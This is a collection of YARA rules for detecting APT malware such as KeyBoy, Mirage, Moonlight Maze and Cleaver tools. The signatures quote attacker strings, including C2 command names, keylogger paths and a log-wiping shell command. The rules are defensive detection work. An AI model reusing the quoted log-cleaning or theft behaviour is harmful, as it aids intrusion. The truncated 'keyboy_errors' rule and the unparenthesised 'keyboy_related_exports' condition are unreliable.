  "new_keyboy_header_codes": "rule new_keyboy_header_codes\n{\n\n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Matches the 2016 sample's header codes\"\n        date = \"2016-08-28\"\n        md5 = \"495adb1b9777002ecfe22aaf52fcee93\"\n\n    strings:\n        $s1 = \"*l*\" wide fullword\n        $s2 = \"*a*\" wide fullword\n        $s3 = \"*s*\" wide fullword\n        $s4 = \"*d*\" wide fullword\n        $s5 = \"*f*\" wide fullword\n        $s6 = \"*g*\" wide fullword\n        $s7 = \"*h*\" wide fullword\n\n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and all of them\n}",
  "keyboy_commands": "rule keyboy_commands\n{\n\n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Matches the 2016 sample's sent and received commands\"\n        date = \"2016-08-28\"\n        md5 = \"495adb1b9777002ecfe22aaf52fcee93\"\n\n    strings:\n        $s1 = \"Update\" wide fullword\n        $s2 = \"UpdateAndRun\" wide fullword\n        $s3 = \"Refresh\" wide fullword\n        $s4 = \"OnLine\" wide fullword\n        $s5 = \"Disconnect\" wide fullword\n        $s6 = \"Pw_Error\" wide fullword\n        $s7 = \"Pw_OK\" wide fullword\n        $s8 = \"Sysinfo\" wide fullword\n        $s9 = \"Download\" wide fullword\n        $s10 = \"UploadFileOk\" wide fullword\n        $s11 = \"RemoteRun\" wide fullword\n        $s12 = \"FileManager\" wide fullword\n\n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and 6 of them\n}",
  "keyboy_errors": "rule keyboy_errors\n{\n\n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Matches the sample's shell error2 log statements\"\n        date = \"2016-08-28\"\n        md5 = \"495adb1b9777002ecfe22aaf52fcee93\"\n\n    strings:\n        //These strings are in ASCII pre-2015 and UNICODE in 2016\n        $error = \"Error2\" ascii wide\n        //2016 specific:\n        $s1 = \"Can't find [%s]!Check the file name and try again!\" ascii wide\n        $s2 = \"Open [%s] error! %d\" ascii wide\n        $s3 = \"The Size of [%s] is zero!\" ascii wide\n        $s4 = \"CreateThread DownloadFile[%s] Error!\" ascii wide\n        $s5 = \"UploadFile [%s] Error:Connect Server Failed!\" ascii wide\n        $s6 = \"Receive [%s] Error(Recved[%d] != Send[%d])!\" ascii wide\n        $s7 = \"Receive [%s] ok! Use %2.2f seconds, Average speed %2.2f k/s\" ascii wide\n        $s8 = \"CreateThread UploadFile[%s] Error!\" ascii wide\n        //Pre-2016:\n        $s9 = \"Ready Download [%s] ok!\" ascii wide\n        $s10 = \"Get ControlInfo from FileClient error!\" ascii wide\n        $s11 = \"FileClient has a error!\" ascii wide\n        $s12 = \"VirtualAlloc SendBuff Error(%d)\" ascii wide\n        $s13 = \"ReadFile [%s] Error(%d)...\" ascii wide\n        $s14 = \"ReadFile [%s] Data[Readed(%d) != FileSize(%d)] Error...\" ascii wide\n        $s15 = \"CreateThread DownloadFile[%s] Error!\" ascii wide\n        $s16 = \"RecvData MyRecv_Info Size Error!\" ascii wide\n        $s17 = \"RecvData MyRecv_Info Tag Error!\" ascii wide\n        $s18 = \"SendData szControlInfo_1 Error!\" ascii wide\n        $s19 = \"SendData szControlInfo_3 Error!\" ascii wide\n        $s20 = \"VirtualAlloc RecvBuff Error(%d)\" ascii wide\n        $s21 = \"RecvData Error!\" ascii wide\n        $s22 = \"WriteFile [%s}",
  "keyboy_systeminfo": "rule keyboy_systeminfo\n{\n\n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Matches the system information format before sending to C2\"\n        date = \"2016-08-28\"\n        md5 = \"495adb1b9777002ecfe22aaf52fcee93\"\n\n    strings:\n        //These strings are ASCII pre-2015 and UNICODE in 2016\n        $s1 = \"SystemVersion:    %s\" ascii wide\n        $s2 = \"Product  ID:      %s\" ascii wide\n        $s3 = \"InstallPath:      %s\" ascii wide\n        $s4 = \"InstallTime:      %d-%d-%d, %02d:%02d:%02d\" ascii wide\n        $s5 = \"ResgisterGroup:   %s\" ascii wide\n        $s6 = \"RegisterUser:     %s\" ascii wide\n        $s7 = \"ComputerName:     %s\" ascii wide\n        $s8 = \"WindowsDirectory: %s\" ascii wide\n        $s9 = \"System Directory: %s\" ascii wide\n        $s10 = \"Number of Processors:       %d\" ascii wide\n        $s11 = \"CPU[%d]:  %s: %sMHz\" ascii wide\n        $s12 = \"RAM:         %dMB Total, %dMB Free.\" ascii wide\n        $s13 = \"DisplayMode: %d x %d, %dHz, %dbit\" ascii wide\n        $s14 = \"Uptime:      %d Days %02u:%02u:%02u\" ascii wide\n\n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and 7 of them\n}",
  "keyboy_related_exports": "rule keyboy_related_exports\n{\n\n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Matches the new 2016 sample's export\"\n        date = \"2016-08-28\"\n        md5 = \"495adb1b9777002ecfe22aaf52fcee93\"\n\n    condition:\n        //MZ header //PE signature //The malware family seems to share many exports //but this is the new kid on the block.\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and pe.exports(\"Embedding\") or pe.exports(\"SSSS\") or pe.exports(\"GetUP\")\n}",
  "keyboy_init_config_section": "rule keyboy_init_config_section\n{\n\n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Matches the Init section where the config is stored\"\n        date = \"2016-08-28\"\n\n    condition:\n        //MZ header //PE signature //Payloads are normally smaller but the new dropper we spotted //is a bit larger. //Observed virtual sizes of the .Init section vary but they've //always been 1024, 2048, or 4096 bytes.\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 300KB and for any i in (0..pe.number_of_sections - 1): (pe.sections[i].name == \".Init\" and pe.sections[i].virtual_size % 1024 == 0)\n}",
  "EliseLotusBlossom": "rule EliseLotusBlossom\n{\n\nmeta:\n    author = \"Jose Ramon Palanco\"\n    date = \"2015-06-23\"\n    description = \"Elise Backdoor Trojan\"\n    ref = \"https://www.paloaltonetworks.com/resources/research/unit42-operation-lotus-blossom.html\"\n\nstrings:\n    $magic = { 4d 5a }\n    $s1 = \"\\\",Update\" wide\n    $s2 = \"LoaderDLL.dll\"\n    $s3 = \"Kernel32.dll\"\n    $s4 = \"{5947BACD-63BF-4e73-95D7-0C8A98AB95F2}\"\n    $s5 = \"\\\\Network\\\\\" wide\n    $s6 = \"0SSSSS\"\n    $s7 = \"441202100205\"\n    $s8 = \"0WWWWW\"\n\ncondition:\n    $magic at 0 and all of ($s*)    \n}",
  "MiniDionis_readerView": "rule MiniDionis_readerView \n{\n\n    meta:\n        description = \"MiniDionis Malware - file readerView.exe / adobe.exe\"\n        author = \"Florian Roth\"\n        reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n        date = \"2015-07-20\"\n        /* Original Hash */\n        hash1 = \"ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145\"\n        /* Derived Samples */\n        hash2 = \"a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004\"\n        hash3 = \"88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f\"\n        hash4 = \"97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7\"\n        hash5 = \"ed7abf93963395ce9c9cba83a864acb4ed5b6e57fd9a6153f0248b8ccc4fdb46\"\n        hash6 = \"56ac764b81eb216ebed5a5ad38e703805ba3e1ca7d63501ba60a1fb52c7ebb6e\"\n\n    strings:\n        $s1 = \"%ws_out%ws\" fullword wide /* score: '8.00' */\n        $s2 = \"dnlibsh\" fullword ascii /* score: '7.00' */\n\n        $op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b } /* Opcode */\n        $op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f } /* Opcode */\n        $op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 } /* Opcode */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of ($s*) and 1 of ($op*)\n}",
  "Malicious_SFX1": "rule Malicious_SFX1 \n{\n\n    meta:\n        description = \"SFX with voicemail content\"\n        author = \"Florian Roth\"\n        reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n        date = \"2015-07-20\"\n        hash = \"c0675b84f5960e95962d299d4c41511bbf6f8f5f5585bdacd1ae567e904cb92f\"\n   \n    strings:\n        $s0 = \"voicemail\" ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n        $s1 = \".exe\" ascii\n   \n    condition:\n        uint16(0) == 0x4b50 and filesize < 1000KB and $s0 in (3..80) and $s1 in (3..80) \n}",
  "Malicious_SFX2": "rule Malicious_SFX2 \n{\n\n    meta:\n        description = \"SFX with adobe.exe content\"\n        author = \"Florian Roth\"\n        reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n        date = \"2015-07-20\"\n        hash = \"502e42dc99873c52c3ca11dd3df25aad40d2b083069e8c22dd45da887f81d14d\"\n\n    strings:\n        $s1 = \"adobe.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */\n        $s2 = \"Extracting files to %s folder$Extracting files to temporary folder\" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00' */\n        $s3 = \"GETPASSWORD1\" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00' */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}",
  "MiniDionis_VBS_Dropped": "rule MiniDionis_VBS_Dropped \n{\n\n    meta:\n        description = \"Dropped File - 1.vbs\"\n        author = \"Florian Roth\"\n        reference = \"https://malwr.com/analysis/ZDc4ZmIyZDI4MTVjNGY5NWI0YzE3YjIzNGFjZTcyYTY/\"\n        date = \"2015-07-21\"\n        hash = \"97dd1ee3aca815eb655a5de9e9e8945e7ba57f458019be6e1b9acb5731fa6646\"\n\n    strings:\n        $s1 = \"Wscript.Sleep 5000\" ascii\n        $s2 = \"Set FSO = CreateObject(\\\"Scripting.FileSystemObject\\\")\" ascii\n        $s3 = \"Set WshShell = CreateObject(\\\"WScript.Shell\\\")\" ascii\n        $s4 = \"If(FSO.FileExists(\\\"\" ascii\n        $s5 = \"then FSO.DeleteFile(\\\".\\\\\" ascii\n\n    condition:\n        filesize < 1KB and all of them and $s1 in (0..40)\n}",
  "MirageStrings": "rule MirageStrings\n{\n    meta:\n        description = \"Mirage Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    strings:\n        $ = \"Neo,welcome to the desert of real.\" wide ascii\n        $ = \"/result?hl=en&id=%s\"\n        \n    condition:\n       any of them\n}",
  "Mirage": "rule Mirage\n{\n    meta:\n        description = \"Mirage\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    condition:\n        MirageStrings\n}",
  "Mirage_APT": "rule Mirage_APT\n{\n    meta:\n        Author      = \"Silas Cutler\"\n        Date        = \"yyyy/mm/dd\"\n        Description = \"Malware related to APT campaign\"\n        Reference   = \"Useful link\"\n    \n    strings:\n        $a1 = \"welcome to the desert of the real\"\n        $a2 = \"Mirage\"\n        $b = \"Encoding: gzip\"\n        $c = /\\/[A-Za-z]*\\?hl=en/\n\n    condition: \n        (($a1 or $a2) or $b) and $c\n}",
  "Molerats_certs": "rule Molerats_certs\n{\n    \n    meta:\n        Author      = \"FireEye Labs\"\n        Date        = \"2013/08/23\"\n        Description = \"this rule detections code signed with certificates used by the Molerats actor\"\n        Reference   = \"https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html\"\n\n    strings:\n        $cert1 = { 06 50 11 A5 BC BF 83 C0 93 28 16 5E 7E 85 27 75 }\n        $cert2 = { 03 e1 e1 aa a5 bc a1 9f ba 8c 42 05 8b 4a bf 28 }\n        $cert3 = { 0c c0 35 9c 9c 3c da 00 d7 e9 da 2d c6 ba 7b 6d }\n\n    condition:\n        1 of ($cert*)\n}",
  "Backdoor_APT_Mongal": "rule Backdoor_APT_Mongal\n{\n\n    meta:\n        author = \"@patrickrolsen\"\n        maltype = \"Backdoor.APT.Mongall\"\n        version = \"0.1\"\n        reference = \"fd69a799e21ccb308531ce6056944842\" \n        date = \"01/04/2014\"\n    \n    strings:\n        $author  = \"author user\"\n        $title   = \"title Vjkygdjdtyuj\" nocase\n        $comp    = \"company ooo\"\n        $cretime = \"creatim\\\\yr2012\\\\mo4\\\\dy19\\\\hr15\\\\min10\"\n        $passwd  = \"password 00000000\"\n    \n    condition:\n        all of them\n}",
  "MongalCode": "rule MongalCode\n{\n    meta:\n        description = \"Mongal code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-15\"\n    \n    strings:\n        // gettickcount value checking\n        $ = { 8B C8 B8 D3 4D 62 10 F7 E1 C1 EA 06 2B D6 83 FA 05 76 EB }\n        \n    condition:\n        any of them\n}",
  "MongalStrings": "rule MongalStrings\n{\n    \n    meta:\n        description = \"Mongal Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-15\"\n        \n    strings:\n        $ = \"NSCortr.dll\"\n        $ = \"NSCortr1.dll\"\n        $ = \"Sina.exe\"\n        \n    condition:\n        any of them\n}",
  "Mongal": "rule Mongal \n{\n    \n    meta:\n        description = \"Mongal\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-15\"\n        \n    condition:\n        MongalCode or MongalStrings\n}",
  "apt_RU_MoonlightMaze_customlokitools": "rule apt_RU_MoonlightMaze_customlokitools {\n\nmeta:\n\t\n\tauthor = \"Kaspersky Lab\"\n\tdate = \"2017-03-15\"\n\tversion = \"1.1\"\n\tlast_modified = \"2017-03-22\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\tdescription = \"Rule to detect Moonlight Maze Loki samples by custom attacker-authored strings\"\n\thash = \"14cce7e641d308c3a177a8abb5457019\"\n\thash = \"a3164d2bbc45fb1eef5fde7eb8b245ea\"\n\thash = \"dabee9a7ea0ddaf900ef1e3e166ffe8a\"\n\thash = \"1980958afffb6a9d5a6c73fc1e2795c2\"\n\thash = \"e59f92aadb6505f29a9f368ab803082e\"\n\nstrings:\n\n\t$a1=\"Write file Ok...\" ascii wide \n\t$a2=\"ERROR: Can not open socket....\" ascii wide\n\t$a3=\"Error in parametrs:\"  ascii wide\n\t$a4=\"Usage: @<get/put> <IP> <PORT> <file>\"  ascii wide\n\t$a5=\"ERROR: Not connect...\"  ascii wide\n\t$a6=\"Connect successful....\"  ascii wide\n\t$a7=\"clnt <%d> rqstd n ll kll\"  ascii wide\n\t$a8=\"clnt <%d> rqstd swap\"  ascii wide\n\t$a9=\"cld nt sgnl prcs grp\" ascii wide\n\t$a10=\"cld nt sgnl prnt\" ascii wide\n\n\t//keeping only ascii version of string ->\n\t$a11=\"ork error\" ascii fullword\n\ncondition:\n\n\t((any of ($a*)))\n\n}",
  "apt_RU_MoonlightMaze_customsniffer": "rule apt_RU_MoonlightMaze_customsniffer {\n\nmeta:\n\t\n\tauthor = \"Kaspersky Lab\"\n\tdate = \"2017-03-15\"\n\tversion = \"1.1\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\tdescription = \"Rule to detect Moonlight Maze sniffer tools\"\n\thash = \"7b86f40e861705d59f5206c482e1f2a5\"\n\thash = \"927426b558888ad680829bd34b0ad0e7\"\n\toriginal_filename = \"ora;tdn\"\n\t\nstrings:\n\n\n\t//strings from ora ->\n\t$a1=\"/var/tmp/gogo\" fullword\n\t$a2=\"myfilename= |%s|\" fullword\n\t$a3=\"mypid,mygid=\" fullword\n\t$a4=\"mypid=|%d| mygid=|%d|\" fullword\n\n\t//strings from tdn ->\n\t$a5=\"/var/tmp/task\" fullword\n\t$a6=\"mydevname= |%s|\" fullword\n\ncondition:\n\n\t((any of ($a*)))\n\n}",
  "loki2crypto": "rule loki2crypto {\n\nmeta:\n\t\n\tauthor = \"Costin Raiu, Kaspersky Lab\"\n\tdate = \"2017-03-21\"\n\tversion = \"1.0\"\n\tdescription = \"Rule to detect hardcoded DH modulus used in 1996/1997 Loki2 sourcecode; #ifdef STRONG_CRYPTO /* 384-bit strong prime */\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\thash = \"19fbd8cbfb12482e8020a887d6427315\"\n\thash = \"ea06b213d5924de65407e8931b1e4326\"\n\thash = \"14ecd5e6fc8e501037b54ca263896a11\"\n\thash = \"e079ec947d3d4dacb21e993b760a65dc\"\n\thash = \"edf900cebb70c6d1fcab0234062bfc28\"\n\nstrings:\n\n\t$modulus={DA E1 01 CD D8 C9 70 AF C2 E4 F2 7A 41 8B 43 39 52 9B 4B 4D E5 85 F8 49}\n\ncondition:\n\n\t(any of them)\n\n}",
  "apt_RU_MoonlightMaze_de_tool": "rule apt_RU_MoonlightMaze_de_tool {\n\nmeta:\n\t\n\tauthor = \"Kaspersky Lab\"\n\tdate = \"2017-03-27\"\n\tversion = \"1.0\"\n\tlast_modified = \"2017-03-27\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\tdescription = \"Rule to detect Moonlight Maze 'de' and 'deg' tunnel tool\"\n\thash = \"4bc7ed168fb78f0dc688ee2be20c9703\"\n\thash = \"8b56e8552a74133da4bc5939b5f74243\"\n\nstrings:\n\n\t$a1=\"Vnuk: %d\" ascii fullword\n\t$a2=\"Syn: %d\" ascii fullword\n\n\t//%s\\r%s\\r%s\\r%s\\r ->\n\t$a3={25 73 0A 25 73 0A 25 73 0A 25 73 0A}\n\ncondition:\n\n\t((2 of ($a*)))\n\n}",
  "apt_RU_MoonlightMaze_cle_tool": "rule apt_RU_MoonlightMaze_cle_tool {\n\nmeta:\n\t\n\tauthor = \"Kaspersky Lab\"\n\tdate = \"2017-03-27\"\n\tversion = \"1.0\"\n\tlast_modified = \"2017-03-27\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\tdescription = \"Rule to detect Moonlight Maze 'cle' log cleaning tool\"\n\thash = \"647d7b711f7b4434145ea30d0ef207b0\"\n\n\t\nstrings:\n\n\t$a1=\"./a filename template_file\" ascii wide\n\t$a2=\"May be %s is empty?\"  ascii wide\n\t$a3=\"template string = |%s|\"   ascii wide\n\t$a4=\"No blocks !!!\"\n\t$a5=\"No data in this block !!!!!!\"  ascii wide\n\t$a6=\"No good line\"\n\ncondition:\n\n\t((3 of ($a*)))\n\n}",
  "apt_RU_MoonlightMaze_xk_keylogger": "rule apt_RU_MoonlightMaze_xk_keylogger {\n\nmeta:\n\t\n\tauthor = \"Kaspersky Lab\"\n\tdate = \"2017-03-27\"\n\tversion = \"1.0\"\n\tlast_modified = \"2017-03-27\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\tdescription = \"Rule to detect Moonlight Maze 'xk' keylogger\"\n\nstrings:\n\n\t$a1=\"Log ended at => %s\"\n\t$a2=\"Log started at => %s [pid %d]\"\n\t$a3=\"/var/tmp/task\" fullword\n\t$a4=\"/var/tmp/taskhost\" fullword\n\t$a5=\"my hostname: %s\"\n\t$a6=\"/var/tmp/tasklog\"\n\t$a7=\"/var/tmp/.Xtmp01\" fullword\n\t$a8=\"myfilename=-%s-\"\n\t$a9=\"/var/tmp/taskpid\"\n\t$a10=\"mypid=-%d-\" fullword\n\t$a11=\"/var/tmp/taskgid\" fullword\n\t$a12=\"mygid=-%d-\" fullword\n\n\ncondition:\n\n\t((3 of ($a*)))\n\n}",
  "apt_RU_MoonlightMaze_encrypted_keylog": "rule apt_RU_MoonlightMaze_encrypted_keylog {\n\nmeta:\n\t\n\tauthor = \"Kaspersky Lab\"\n\tdate = \"2017-03-27\"\n\tversion = \"1.0\"\n\tlast_modified = \"2017-03-27\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\tdescription = \"Rule to detect Moonlight Maze encrypted keylogger logs\"\n\nstrings:\n\n\t$a1={47 01 22 2A 6D 3E 39 2C}\n\ncondition:\n\n\t($a1 at 0)\n\n}",
  "apt_RU_MoonlightMaze_IRIX_exploit_GEN": "rule apt_RU_MoonlightMaze_IRIX_exploit_GEN {\n\nmeta:\n\t\n\tauthor = \"Kaspersky Lab\"\n\tdate = \"2017-03-27\"\n\tversion = \"1.0\"\n\tlast_modified = \"2017-03-27\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\tdescription = \"Rule to detect Irix exploits from David Hedley used by Moonlight Maze hackers\"\n\treference2 = \"https://www.exploit-db.com/exploits/19274/\"\n\thash = \"008ea82f31f585622353bd47fa1d84be\" //df3\n\thash = \"a26bad2b79075f454c83203fa00ed50c\" //log\n\thash = \"f67fc6e90f05ba13f207c7fdaa8c2cab\" //xconsole\n\thash = \"5937db3896cdd8b0beb3df44e509e136\" //xlock\n\thash = \"f4ed5170dcea7e5ba62537d84392b280\" //xterm\n\nstrings:\n\n\t$a1=\"stack = 0x%x, targ_addr = 0x%x\"\n\t$a2=\"execl failed\"\n\ncondition:\n\n\t(uint32(0)==0x464c457f) and (all of them)\n\n}",
  "apt_RU_MoonlightMaze_u_logcleaner": "rule apt_RU_MoonlightMaze_u_logcleaner {\n\nmeta:\n\t\n\tauthor = \"Kaspersky Lab\"\n\tdate = \"2017-03-27\"\n\tversion = \"1.0\"\n\tlast_modified = \"2017-03-27\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\tdescription = \"Rule to detect log cleaners based on utclean.c\"\n\treference2 = \"http://cd.textfiles.com/cuteskunk/Unix-Hacking-Exploits/utclean.c\"\n\thash = \"d98796dcda1443a37b124dbdc041fe3b\"\n\thash = \"73a518f0a73ab77033121d4191172820\"\n\nstrings:\n\n\t$a1=\"Hiding complit...n\"\n\t$a2=\"usage: %s <username> <fixthings> [hostname]\"\n\t$a3=\"ls -la %s* ; /bin/cp  ./wtmp.tmp %s; rm  ./wtmp.tmp\"\n\ncondition:\n\n\t(uint32(0)==0x464c457f) and (any of them)\n\n}",
  "apt_RU_MoonlightMaze_wipe": "rule apt_RU_MoonlightMaze_wipe {\n\nmeta:\n\t\n\tauthor = \"Kaspersky Lab\"\n\tdate = \"2017-03-27\"\n\tversion = \"1.0\"\n\tlast_modified = \"2017-03-27\"\n\treference = \"https://en.wikipedia.org/wiki/Moonlight_Maze\"\n\tdescription = \"Rule to detect log cleaner based on wipe.c\"\n\treference2 = \"http://www.afn.org/~afn28925/wipe.c\"\n\thash = \"e69efc504934551c6a77b525d5343241\"\n\nstrings:\n\n\t$a1=\"ERROR: Unlinking tmp WTMP file.\"\n\t$a2=\"USAGE: wipe [ u|w|l|a ] ...options...\"\n\t$a3=\"Erase acct entries on tty :   wipe a [username] [tty]\"\n\t$a4=\"Alter lastlog entry       :   wipe l [username] [tty] [time] [host]\"\n\ncondition:\n\n\t(uint32(0)==0x464c457f) and (2 of them)\n\n}",
  "APT_NGO_wuaclt": "rule APT_NGO_wuaclt\n{\n   \n   meta:\n    author = \"AlienVault Labs\"\n  \n  strings:\n    $a = \"%%APPDATA%%\\\\Microsoft\\\\wuauclt\\\\wuauclt.dat\"\n    $b = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\"\n    $c = \"/news/show.asp?id%d=%d\"\n    \n    $d = \"%%APPDATA%%\\\\Microsoft\\\\wuauclt\\\\\"\n    $e = \"0l23kj@nboxu\"\n    \n    $f = \"%%s.asp?id=%%d&Sid=%%d\"\n    $g = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SP Q%%d)\"\n    $h = \"Cookies: UseID=KGIOODAOOK%%s\"\n\n  condition:\n    ($a and $b and $c) or ($d and $e) or ($f and $g and $h)\n}",
  "APT_NGO_wuaclt_PDF": "rule APT_NGO_wuaclt_PDF\n{\n        meta:\n            author = \"AlienVault Labs\"\n\n    strings:\n        $pdf  = \"%PDF\" nocase\n        $comment = {3C 21 2D 2D 0D 0A 63 57 4B 51 6D 5A 6C 61 56 56 56 56 56 56 56 56 56 56 56 56 56 63 77 53 64 63 6A 4B 7A 38 35 6D 37 4A 56 6D 37 4A 46 78 6B 5A 6D 5A 6D 52 44 63 5A 58 41 73 6D 5A 6D 5A 7A 42 4A 31 79 73 2F 4F 0D 0A}\n    \n    condition:\n        $pdf at 0 and $comment in (0..200)\n}",
  "ZhoupinExploitCrew": "rule ZhoupinExploitCrew\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"zhoupin exploit crew\" nocase\n    $s2 = \"zhopin exploit crew\" nocase\n\n  condition:\n    1 of them\n}",
  "BackDoorLogger": "rule BackDoorLogger\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"BackDoorLogger\"\n    $s2 = \"zhuAddress\"\n\n  condition:\n    all of them\n}",
  "Jasus": "rule Jasus\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"pcap_dump_open\"\n    $s2 = \"Resolving IPs to poison...\"\n    $s3 = \"WARNNING: Gateway IP can not be found\"\n\n  condition:\n    all of them\n}",
  "LoggerModule": "rule LoggerModule\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"%s-%02d%02d%02d%02d%02d.r\"\n    $s2 = \"C:\\\\Users\\\\%s\\\\AppData\\\\Cookies\\\\\"\n\n  condition:\n    all of them\n}",
  "NetC": "rule NetC\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"NetC.exe\" wide\n    $s2 = \"Net Service\"\n\n  condition:\n    all of them\n}",
  "ShellCreator2": "rule ShellCreator2\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"ShellCreator2.Properties\"\n    $s2 = \"set_IV\"\n\n  condition:\n    all of them\n}",
  "SmartCopy2": "rule SmartCopy2\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"SmartCopy2.Properties\"\n    $s2 = \"ZhuFrameWork\"\n\n  condition:\n    all of them\n}",
  "SynFlooder": "rule SynFlooder\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"Unable to resolve [ %s ]. ErrorCode %d\"\n    $s2 = \"your target's IP is : %s\"\n    $s3 = \"Raw TCP Socket Created successfully.\"\n\n  condition:\n    all of them\n}",
  "TinyZBot": "rule TinyZBot\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"NetScp\" wide\n    $s2 = \"TinyZBot.Properties.Resources.resources\"\n    $s3 = \"Aoao WaterMark\"\n    $s4 = \"Run_a_exe\"\n    $s5 = \"netscp.exe\"\n    $s6 = \"get_MainModule_WebReference_DefaultWS\"\n    $s7 = \"remove_CheckFileMD5Completed\"\n    $s8 = \"http://tempuri.org/\"\n    $s9 = \"Zhoupin_Cleaver\"\n\n  condition:\n    ($s1 and $s2) or ($s3 and $s4 and $s5) or ($s6 and $s7 and $s8) or ($s9)\n}",
  "antivirusdetector": "rule antivirusdetector\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n    strings:\n        $s1 = \"getShadyProcess\"\n        $s2 = \"getSystemAntiviruses\"\n        $s3 = \"AntiVirusDetector\"\n\n    condition:\n        all of them\n}",
  "csext": "rule csext\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"COM+ System Extentions\"\n    $s2 = \"csext.exe\"\n    $s3 = \"COM_Extentions_bin\"\n\n  condition:\n    all of them\n}",
  "kagent": "rule kagent\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"kill command is in last machine, going back\"\n    $s2 = \"message data length in B64: %d Bytes\"\n\n  condition:\n    all of them\n}",
  "mimikatzWrapper": "rule mimikatzWrapper : Toolkit\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"mimikatzWrapper\"\n    $s2 = \"get_mimikatz\"\n\n  condition:\n    all of them\n}",
  "pvz_in": "rule pvz_in\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"LAST_TIME=00/00/0000:00:00PM$\"\n    $s2 = \"if %%ERRORLEVEL%% == 1 GOTO line\"\n\n  condition:\n    all of them\n}",
